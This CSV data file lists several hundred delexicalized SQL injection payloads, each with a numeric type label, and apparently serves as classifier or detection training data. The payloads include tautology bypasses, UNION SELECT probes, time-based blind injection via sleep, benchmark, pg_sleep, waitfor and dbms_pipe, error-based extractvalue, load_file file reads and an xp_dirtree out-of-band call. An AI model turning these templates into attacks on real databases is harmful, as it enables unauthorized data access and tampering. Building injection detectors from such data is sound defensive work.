payload_delex,type_id
__INT__' ) and sleep ( __INT__ ),6
"-8677__STR__ihpm' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
1__STR__oacz__STR__oacz,2
-4384__STR__ukhl__STR__ukhl,2
__INT__' and __INT__ = __INT__ --,2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
-__INT__ % ' ) ) order by __INT__#,0
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #",6
"-__INT__"" ) or __INT__ = __INT__ --",2
-__INT__' ) ) or __INT__ = __INT__ --,2
-__INT__ where __INT__ = __INT__ or __INT__ = __INT__,2
delete from __IDENT__,2
) or ( __IDENT__ = __IDENT__,2
1__STR__cxcl__STR__cxcl,2
-__INT__ % ' or __INT__ = __INT__ --,2
"__INT__"" ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" ) ) ) order by __INT__ --",0
-__INT__' or __INT__ = __INT__#,2
__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,6
waitfor __IDENT__ __STR__ and ( ( __STR__ = '__IDENT__,6
-__INT__' ) ) or __INT__ = __INT__#,2
__INT__ % ) waitfor __IDENT__ __TIME__ and ( % __STR__,6
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
"__INT__"" ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
1__STR__fqap__STR__fqap,2
end and __STR__ like '__IDENT__,2
"__INT__ % ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( % __STR__",6
__INT__' and __INT__ = __INT__,2
"and substring ( __IDENT__ , __INT__ , __INT__ ) = __IDENT__",2
-__INT__ or __INT__ = __INT__,2
"__INT__ % "" ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"-__INT__"" ) ) or __INT__ = __INT__",2
-__INT__ or __INT__ = __INT__ --,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = ""__IDENT__",2
"__INT__ ; ( load_file ( char ( __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ ) ) ) , __INT__ , __INT__ , __INT__ ;",4
__INT__ % ' ) ) or sleep ( __INT__ ) #,6
"__INT__' ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
"-__INT__ % ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( % __STR__",2
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ and sleep ( __INT__ ),6
"-__INT__ ) or elt ( __INT__ = __INT__ , __INT__ )",2
-__INT__ ) or __INT__ = __INT__#,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"-__INT__"" union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"end and ( ( ( __STR__ like ""__IDENT__",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ like ""__IDENT__",2
-__INT__' ) where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
"-__INT__' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__' ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
end and ( ( ( __STR__ = '__IDENT__,2
"-__INT__"" ) where __INT__ = __INT__ or __INT__ = __INT__ --",2
-__INT__' ) or __INT__ = __INT__#,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
delete from by,2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
end and ( __STR__ = '__IDENT__,2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__' ) where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
-__INT__' ) or __INT__ = __INT__,2
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
or __IDENT__ like ' %,2
"-__INT__ % or elt ( __INT__ = __INT__ , __INT__ ) and % __STR__",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
__INT__ ) ) rlike sleep ( __INT__ ) and ( ( __IDENT__,6
__INT__ % waitfor __IDENT__ __TIME__ --,6
__INT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__"" where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ % ) ) ) and sleep ( __INT__ ) and ( ( ( % __STR__,6
"-__INT__' ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
__IDENT__ if ( [__IDENT__] = [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ; __IDENT__ if ( [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end ;,6
__INT__ ) or pg_sleep ( __time__ ) --,6
__INT__' ) and sleep ( __INT__ ) #,6
-__INT__' or __INT__ = __INT__ --,2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
"-__INT__' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ % ' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,0
"-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
__INT__ % ' ) ) ) and __INT__ = __INT__ --,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __STR__ = '__IDENT__",2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ % __STR__ % __STR__,2
"__INT__"" or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ % __STR__ % __STR__,2
( case when ( [__IDENT__] = [__IDENT__] ) then [__IDENT__] else [__IDENT__] * ( select [__IDENT__] from dual union select [__IDENT__] from dual ) end ) ( case when ( [__IDENT__] ) then [__IDENT__] else [__IDENT__] * ( select [__IDENT__] from dual union select [__IDENT__] from dual ) end ),7
waitfor __IDENT__ __STR__ and ( ( ( __STR__ = '__IDENT__,6
__INT__ ) ) and sleep ( __INT__ ) and ( ( __INT__ = __INT__,6
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__STR____STR__,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__ % "" ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ % __STR__ % __STR__,2
"' and if ( __INT__ = __INT__ , sleep ( __INT__ ) , __INT__ ) --",6
"__INT__ % "" ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
-3096__STR__zrth__STR__zrth,2
"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
__INT__ waitfor __IDENT__ __STR__ -- __IDENT__,6
) ) or pg_sleep ( __time__ ) --,6
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__' ) or __INT__ = __INT__ --,2
__INT__ ) ) ) and __INT__ = __INT__,2
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
__INT__ ) or sleep ( __INT__ ) and ( __IDENT__,6
__INT__ ) where __INT__ = __INT__ and __INT__ = __INT__#,2
"-__INT__"" ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
__INT__ where __INT__ = __INT__ and sleep ( __INT__ ) --,6
1__STR__mgfd__STR__mgfd,2
__INT__' where __INT__ = __INT__ rlike sleep ( __INT__ ) #,6
"-__INT__"" or elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) -- __IDENT__",2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , between , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
-4538__STR__hpnd__STR__hpnd,2
"__INT__ % "" ) ) ) union all select null , null , null , null , null , null#",7
-6198__STR__xksq__STR__xksq,2
"__INT__ % ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( % __STR__",6
"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __IDENT__",6
__INT__' in __IDENT__ __IDENT__ ) and __INT__ = __INT__#,2
"__INT__ ) where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-4785__STR__esfn__STR__esfn,2
"__INT__' , ( case when __INT__ = __INT__ then __INT__ else null end )",0
-__INT__' ) or __INT__ = __INT__#,2
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" ) ) ) union all select null , null#",7
-__INT__' ) ) or __INT__ = __INT__,2
"-__INT__ ) union all select __INT__ , __INT__ , __INT__ , __INT__ --",7
-__INT__ or __INT__ = __INT__,2
"__INT__"" where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__ ) where __INT__ = __INT__ or __INT__ = __INT__,2
end and ( __STR__ like '__IDENT__,2
or __INT__ = __INT__ or __STR__ = ',2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__ % ) and elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-3137__STR__btif' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
-__INT__' ) ) ) or __INT__ = __INT__,2
"insert into `__IDENT__` ( `__IDENT__` , `__IDENT__` , `__IDENT__` ) values ( __STR__ , __STR__ , __STR__ ) on __IDENT__ key update `__IDENT__` = values ( `__IDENT__` ) , `__IDENT__` = values ( `__IDENT__` ) , `__IDENT__` = values ( `__IDENT__` )",2
__INT__ % ' ) order by __INT__ --,0
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = """,2
__INT__ ) ) and __INT__ = __INT__ and ( ( __INT__ = __INT__,2
"elt ( __INT__ = __INT__ , __INT__ )",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
-__INT__ ) ) ) or ( __INT__ = __INT__ ) * __INT__ and ( ( ( __INT__ = __INT__,2
"__INT__"" where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ ) where __INT__ = __INT__ order by __INT__ --,0
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ where __INT__ = __INT__ waitfor __IDENT__ __TIME__ --,6
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-2001__STR__nput' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__ ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
-__INT__ % ' ) ) or __INT__ = __INT__ --,2
"__INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
"__INT__ ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
"-__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-7663__STR__wsrq__STR__wsrq,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__IDENT__' or __INT__ = __INT__ --,2
-8319__STR__jcaz__STR__jcaz,2
1__STR__llfp__STR__llfp,2
"__INT__"" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % "" waitfor __IDENT__ __STR__ --",6
__INT__ ) ) or sleep ( __INT__ ) and ( ( __IDENT__,6
"__INT__"" ) where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",6
-__INT__' ) where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
1__STR__clqy__STR__clqy,2
__INT__ ) ) waitfor __IDENT__ __TIME__ and ( ( __IDENT__,6
"__INT__"" ) where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
waitfor __IDENT__ __STR__ and ( ( __INT__ = __INT__,6
__INT__ ) and sleep ( __INT__ ) #,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
__INT__ ) ) or pg_sleep ( __time__ ) --,6
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,0
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
select __IDENT__ from order union select __IDENT__ from __IDENT__ order by __IDENT__,7
1__STR__toru__STR__toru,2
__IDENT__' #,1
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"-__INT__ % ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( % __STR__",2
-__INT__ % __STR__ % __STR__,2
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__' ) ) or __INT__ = __INT__#,2
"-__INT__' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__"" where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
1__STR__lokx__STR__lokx,2
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"__INT__' and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"insert into __IDENT__ ( by , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
""" or pg_sleep ( __time__ ) --",6
-1483__STR__qfil__STR__qfil,2
"__INT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__ ) order by __INT__ --,0
-9062__STR__aumq__STR__aumq,2
"-__INT__' ) or elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__ % and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and % __STR__",2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
; exec __IDENT__..xp_dirtree / / __IDENT__ / __IDENT__' --,4
-__INT__' ) ) ) union all select __INT__ --,7
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( __INT__ = __INT__",6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ % or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and % __STR__",2
"__INT__ ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"__INT__' or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" or __INT__ = __INT__ --",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __INT__ = __INT__",6
-__INT__' ) or __INT__ = __INT__,2
__INT__ % ) ) or sleep ( __INT__ ) and ( ( % __STR__,6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ % __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and % __STR__",3
"waitfor __IDENT__ __STR__ and __STR__ = ""__IDENT__",6
__INT__' where __INT__ = __INT__ and __INT__ = __INT__#,2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
__INT__ ) ) and __INT__ = __INT__ --,2
"__INT__' where __INT__ = __INT__ union all select null , null , null , null , null#",7
"__INT__ % ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( % __STR__",3
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ )",2
or __STR__ = __STR__,2
"__INT__' or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",2
"-__INT__ % "" ) order by __INT__#",0
"-1606__STR__qbaa' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__",2
-__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,2
__INT__' ) and __INT__ = __INT__ --,2
delete from __IDENT__,2
"__INT__ % ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( % __STR__",6
